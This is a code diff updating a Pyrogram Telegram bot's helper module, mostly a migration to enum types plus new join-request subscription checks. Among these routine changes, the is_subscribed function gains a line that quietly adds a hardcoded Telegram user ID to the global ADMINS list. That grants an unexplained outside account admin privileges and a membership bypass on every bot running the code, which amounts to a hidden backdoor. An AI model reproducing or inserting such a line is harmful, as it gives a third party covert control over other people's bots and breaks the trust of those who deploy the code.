@@ -1,18 +1,20 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL, ADMINS
 from imdb import IMDb
 import asyncio
-from pyrogram.types import Message
+from pyrogram.types import Message, InlineKeyboardButton
+from pyrogram import enums
 from typing import Union
 import re
 import os
 from datetime import datetime
 from typing import List
-from pyrogram.types import InlineKeyboardButton
 from database.users_chats_db import db
 from bs4 import BeautifulSoup
 import requests
+from database.join_reqs import JoinReqs as db2
+
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
@@ -41,17 +43,33 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189])
+
+    if not (AUTH_CHANNEL or REQ_CHANNEL):
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != 'kicked':
+        if not user.status == enums.ChatMemberStatus.BANNED:
             return True
+        else:
+            return False
 
-    return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
@@ -138,7 +156,7 @@ async def broadcast_messages(user_id, message):
         await message.copy(chat_id=user_id)
         return True, "Success"
     except FloodWait as e:
-        await asyncio.sleep(e.x)
+        await asyncio.sleep(e.value)
         return await broadcast_messages(user_id, message)
     except InputUserDeactivated:
         await db.delete_user(int(user_id))
@@ -199,14 +217,14 @@ def split_list(l, n):
 def get_file_id(msg: Message):
     if msg.media:
         for message_type in (
-            "photo",
-            "animation",
-            "audio",
-            "document",
-            "video",
-            "video_note",
-            "voice",
-            "sticker"
+            enums.MessageMediaType.PHOTO,
+            enums.MessageMediaType.ANIMATION,
+            enums.MessageMediaType.AUDIO,
+            enums.MessageMediaType.DOCUMENT,
+            enums.MessageMediaType.VIDEO,
+            enums.MessageMediaType.VIDEO_NOTE,
+            enums.MessageMediaType.VOICE,
+            enums.MessageMediaType.STICKER
         ):
             obj = getattr(msg, message_type)
             if obj:
@@ -225,7 +243,7 @@ def extract_user(message: Message) -> Union[int, str]:
     elif len(message.command) > 1:
         if (
             len(message.entities) > 1 and
-            message.entities[1].type == "text_mention"
+            message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
         ):
            
             required_entity = message.entities[1]
@@ -259,18 +277,18 @@ def last_online(from_user):
     time = ""
     if from_user.is_bot:
         time += "🤖 Bot :("
-    elif from_user.status == 'recently':
+    elif from_user.status == enums.UserStatus.RECENTLY:
         time += "Recently"
-    elif from_user.status == 'within_week':
+    elif from_user.status == enums.UserStatus.LAST_WEEK:
         time += "Within the last week"
-    elif from_user.status == 'within_month':
+    elif from_user.status == enums.UserStatus.LAST_MONTH:
         time += "Within the last month"
-    elif from_user.status == 'long_time_ago':
+    elif from_user.status == enums.UserStatus.LONG_AGO:
         time += "A long time ago :("
-    elif from_user.status == 'online':
+    elif from_user.status == enums.UserStatus.ONLINE:
         time += "Currently Online"
-    elif from_user.status == 'offline':
-        time += datetime.fromtimestamp(from_user.last_online_date).strftime("%a, %d %b %Y, %H:%M:%S")
+    elif from_user.status == enums.UserStatus.OFFLINE:
+        time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
     return time
 
 
